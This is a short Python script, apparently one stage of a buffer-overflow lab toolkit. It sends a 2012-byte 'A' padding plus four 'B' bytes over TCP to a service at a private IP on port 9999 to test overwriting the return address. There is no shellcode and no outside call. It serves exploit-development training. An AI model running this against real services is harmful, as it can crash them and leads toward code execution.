#!/usr/bin/python3
# 4overwrite.py
# https://github.com/hungryrussian/bufferoverflowtoolkit

import sys, socket

ip = "192.168.1.120"
port = 9999
command = ""

# replace A multiplier with offset value found with pattern_offset.rb
offset = 2012
overflow = "A" * offset
payload = "B"*4

string = command + overflow + payload + "\r\n"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    print
    s.send(bytes(string, "latin-1"))
    s.recv(1024)

except:
    print("Could not connect to server.")
    sys.exit()
